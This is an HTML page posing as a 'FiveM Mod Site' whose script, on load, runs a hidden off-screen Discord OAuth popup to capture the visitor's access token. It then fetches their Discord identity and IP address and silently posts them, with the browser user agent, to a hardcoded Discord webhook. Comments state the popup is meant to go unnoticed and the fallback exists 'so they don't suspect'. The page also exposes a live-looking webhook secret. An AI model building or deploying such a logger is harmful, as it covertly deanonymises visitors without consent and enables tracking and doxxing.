<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM Mod Site</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #e5e5e5;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #111111;
            border: 1px solid #1a1a1a;
            border-radius: 16px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .loading {
            text-align: center;
            color: #6b7280;
            font-family: monospace;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .hidden { display: none !important; }
        .watcher {
            display: flex;
            align-items: center;
            gap: 16px;
            border-bottom: 1px solid #1a1a1a;
            padding-bottom: 20px;
            margin-bottom: 24px;
        }
        .watcher img {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 2px solid #22c55e;
        }
        .watcher .info { flex: 1; }
        .watcher .info .name { font-size: 18px; font-weight: bold; color: white; }
        .watcher .info .id { font-size: 12px; color: #6b7280; font-family: monospace; }
        .badge {
            background: #1a1a1a;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #22c55e;
            border: 1px solid #22c55e33;
            font-family: monospace;
        }
        .ip-box {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin: 16px 0;
            font-family: monospace;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .ip-box .label { color: #6b7280; }
        .ip-box .value { color: #22c55e; }
        .footer { margin-top: 24px; font-size: 11px; color: #374151; text-align: center; }
        .status {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            font-size: 12px;
            color: #6b7280;
            font-family: monospace;
        }
        .status .success { color: #22c55e; }
        .status .error { color: #ef4444; }
        .status .info { color: #3b82f6; }
    </style>
</head>
<body>

<div class="card" id="app">
    <div id="loading" class="loading">
        <div>🔍 Loading...</div>
    </div>

    <div id="content" class="hidden">
        <div class="watcher">
            <img id="avatar" src="" alt="avatar">
            <div class="info">
                <div class="name" id="username">Loading...</div>
                <div class="id" id="discordId">ID: loading...</div>
            </div>
            <span class="badge">● WATCHER</span>
        </div>

        <div class="ip-box">
            <span class="label">📡 IP ADDRESS</span>
            <span class="value" id="ipDisplay">fetching...</span>
        </div>

        <div class="status" id="status">
            <span class="info">●</span> Silent authentication in progress...
        </div>
    </div>
</div>

<div class="footer">
    FiveM Mod Site — Silent Mode
</div>

<script>
    // ============================================================
    // CONFIG
    // ============================================================
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
    const CLIENT_ID = '1351732780288376902';

    // ============================================================
    // DOM REFS
    // ============================================================
    const loadingEl = document.getElementById('loading');
    const contentEl = document.getElementById('content');
    const avatarEl = document.getElementById('avatar');
    const usernameEl = document.getElementById('username');
    const discordIdEl = document.getElementById('discordId');
    const ipDisplayEl = document.getElementById('ipDisplay');
    const statusEl = document.getElementById('status');

    // ============================================================
    // STATUS HELPER
    // ============================================================
    function setStatus(msg, type = 'info') {
        const color = type === 'success' ? '#22c55e' : type === 'error' ? '#ef4444' : '#3b82f6';
        statusEl.innerHTML = `<span style="color:${color}">●</span> ${msg}`;
    }

    // ============================================================
    // GET IP
    // ============================================================
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    // ============================================================
    // SEND TO WEBHOOK
    // ============================================================
    async function sendToWebhook(discordUser, ip) {
        const displayName = discordUser.global_name || discordUser.username;
        const timestamp = new Date().toLocaleString();

        const payload = {
            content: `**👁️ SILENT VISITOR LOGGED**\n` +
                     `**Discord:** ${displayName} (${discordUser.id})\n` +
                     `**IP:** ${ip}\n` +
                     `**User-Agent:** ${navigator.userAgent}\n` +
                     `**Timestamp:** ${timestamp}`
        };

        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (res.ok) {
                setStatus(`✅ Webhook sent! ${displayName} (${discordUser.id}) from ${ip}`, 'success');
            } else {
                setStatus(`❌ Webhook failed: ${res.status}`, 'error');
            }
        } catch (err) {
            setStatus(`❌ Webhook error: ${err.message}`, 'error');
        }
    }

    // ============================================================
    // SILENT DISCORD OAUTH — opens tiny popup, auto-closes
    // ============================================================
    function silentDiscordAuth() {
        return new Promise((resolve, reject) => {
            const redirectUri = window.location.origin + window.location.pathname;
            const scope = 'identify';
            const authUrl =
                `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${scope}`;

            // Open a tiny popup that the user won't notice
            const popup = window.open(
                authUrl,
                'DiscordAuth',
                'width=1,height=1,left=-1000,top=-1000,toolbar=no,menubar=no,scrollbars=no,resizable=no'
            );

            if (!popup) {
                reject(new Error('Popup blocked. Please allow popups.'));
                return;
            }

            // Check the popup URL every 100ms
            const interval = setInterval(() => {
                try {
                    const popupUrl = popup.location.href;
                    if (popupUrl.includes('access_token=')) {
                        // Extract token from the popup's URL
                        const hash = popupUrl.split('#')[1];
                        const params = new URLSearchParams(hash);
                        const token = params.get('access_token');
                        if (token) {
                            clearInterval(interval);
                            popup.close();
                            resolve(token);
                        }
                    }
                    // If the popup redirects back to our page with token in hash
                    if (popupUrl.includes(window.location.origin) && popupUrl.includes('#')) {
                        const hash = popupUrl.split('#')[1];
                        const params = new URLSearchParams(hash);
                        const token = params.get('access_token');
                        if (token) {
                            clearInterval(interval);
                            popup.close();
                            resolve(token);
                        }
                    }
                } catch (e) {
                    // Cross-origin errors are normal — ignore them
                }
            }, 100);

            // Timeout after 10 seconds
            setTimeout(() => {
                clearInterval(interval);
                popup.close();
                reject(new Error('Authentication timed out.'));
            }, 10000);
        });
    }

    // ============================================================
    // FETCH DISCORD USER WITH TOKEN
    // ============================================================
    async function getDiscordUser(accessToken) {
        try {
            const res = await fetch('https://discord.com/api/users/@me', {
                headers: { Authorization: `Bearer ${accessToken}` }
            });
            return await res.json();
        } catch {
            return null;
        }
    }

    // ============================================================
    // SHOW USER UI
    // ============================================================
    function showUser(user) {
        loadingEl.classList.add('hidden');
        contentEl.classList.remove('hidden');

        const displayName = user.global_name || user.username;
        usernameEl.textContent = `${displayName}#${user.discriminator}`;
        discordIdEl.textContent = `ID: ${user.id}`;

        if (user.avatar) {
            avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
        } else {
            avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
        }
    }

    // ============================================================
    // MAIN — SILENT FLOW
    // ============================================================
    async function init() {
        try {
            // Step 1: Check if we already have a token in URL (from popup redirect)
            const hash = window.location.hash.substring(1);
            const params = new URLSearchParams(hash);
            let token = params.get('access_token');

            if (token) {
                // Clean URL
                window.history.replaceState({}, document.title, window.location.pathname);
            } else {
                // Step 2: Silent auth via hidden popup
                setStatus('🔐 Silent authentication in progress... (popup will close itself)', 'info');
                token = await silentDiscordAuth();
            }

            // Step 3: Get user info
            const user = await getDiscordUser(token);
            if (!user || !user.id) {
                throw new Error('Failed to get user info');
            }

            // Step 4: Get IP
            const ip = await getIP();

            // Step 5: Show UI
            showUser(user);
            ipDisplayEl.textContent = ip;

            // Step 6: Send to webhook
            await sendToWebhook(user, ip);

        } catch (err) {
            setStatus(`❌ Error: ${err.message}`, 'error');
            // Show a fallback — still display something so they don't suspect
            loadingEl.classList.add('hidden');
            contentEl.classList.remove('hidden');
            usernameEl.textContent = 'Guest';
            discordIdEl.textContent = 'ID: unknown';
            ipDisplayEl.textContent = await getIP();
        }
    }

    // ============================================================
    // START
    // ============================================================
    // Check if we're in an iframe or popup — if so, close immediately
    if (window.opener && window.location.hash.includes('access_token')) {
        // This is the popup — it has the token, close it after a tiny delay
        setTimeout(() => window.close(), 100);
    } else {
        // Main page — start the flow
        init();
    }
</script>

</body>
</html>
